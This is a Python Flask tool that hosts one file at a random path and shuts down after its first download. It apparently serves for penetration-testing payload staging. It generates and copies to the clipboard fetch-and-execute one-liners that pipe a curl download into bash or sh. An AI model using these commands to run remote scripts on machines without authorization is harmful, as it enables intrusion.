from flask import Flask, Response
import argparse
import random
import string
import netifaces as ni
import pyperclip

import os
import signal

if __name__ == '__main__':

    #Define app
    app = Flask(__name__)

    ### Argparse stuff
    parser = argparse.ArgumentParser(
            prog = "python3 OneTimeScript.py",
            description = "Deploy a http server which hosts a single file (like a script). Once that file is read, the server closes")
    parser.add_argument('-f', '--file', type=str, metavar='FILE', required=True, help="The file to serve")
    parser.add_argument('-P', '--path', type=str, metavar='PATH', required=False, help="The path to serve the file at, default will be random")
    parser.add_argument('-l', '--lhost', type=str, metavar='HOST', required=False, help="The lhost to listen on, by default will be all addresses", default="0.0.0.0")
    parser.add_argument('-p', '--port', type=int, metavar='PORT', required=False, help="The port to listen on, by default will be 8080", default=8080)
    parser.add_argument('-c', '--copy', type=str, metavar='SHELL_TYPE', required=False, help="The type of shell to copy to clipboard (default bash):\n  - none: n or none\n  - bash: b or bash\n  - sh: s or sh", default="bash")

    args = parser.parse_args()

    ### Settings vars
    file = args.file
    port = args.port

    #Set path to random if there is none
    path = args.path
    if not path:
        path = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(6))
    
    #Determine if lhost is an interface or not
    lhost = args.lhost
    try:
        interface = ni.ifaddresses(lhost)
        lhost = interface[ni.AF_INET][0]['addr']
    except ValueError as e:
        pass

    #Determine copy type
    copyOptions = ["b", "bash", "s", "sh", "n", "none"]
    copy = args.copy
    if copy not in copyOptions:
        print("[-] Unknown copy type for -c")
        exit(1)

    ### Define the route to serve the file
    @app.route('/%s'%path, methods=["GET"])
    def serve_file():
        with open(file, 'r') as f: response = Response(f.read())
        
        @response.call_on_close
        def on_close():
            print("[+] Closing server...")
            
            sig = getattr(signal, "SIGINT", signal.SIGTERM)
            os.kill(os.getpid(), sig)

        return response

    formatJson = {"lhost": lhost, "port": port, "path": path}
    fullUrl =  "http://%(lhost)s:%(port)s/%(path)s"%(formatJson)
    exBash = "/bin/bash <(curl -s http://%(lhost)s:%(port)s/%(path)s)"%(formatJson)
    exSh = "curl -s http://%(lhost)s:%(port)s/%(path)s | sh"%(formatJson)

    print("""
[+] Server starting
    - Your file is being served at %s
    - To run directly in different shells:
        %s
        %s
    """%(fullUrl, exBash, exSh))

    if(copy != "n" and copy != "none"):
        if copy == "b" or copy == "bash":
            pyperclip.copy(exBash)
            print("[+] Copied bash string to clipboard\n")
        elif copy == "s" or copy == "sh":
            pyperclip.copy(exSh)
            print("[+] Copied sh string to clipboard\n")

    app.run(host=lhost, port=port, debug=False)

    
